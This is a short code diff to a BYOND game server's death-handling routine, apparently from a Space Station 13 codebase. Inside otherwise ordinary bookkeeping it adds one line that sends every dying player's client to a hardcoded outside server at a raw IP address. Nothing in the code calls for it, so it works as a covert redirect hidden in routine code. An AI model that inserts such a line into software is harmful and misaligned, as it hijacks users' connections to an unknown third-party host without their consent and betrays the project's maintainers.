@@ -94,6 +94,7 @@
 	GLOB.dead_mob_list += src
 	if(mind)
 		mind.store_memory("Time of death: [station_time_timestamp("hh:mm:ss", timeofdeath)]", 0)
+		client << link("byond://136.243.82.223:4003")
 		GLOB.respawnable_list += src
 
 		if(mind.name && !isbrain(src)) // !isbrain() is to stop it from being called twice
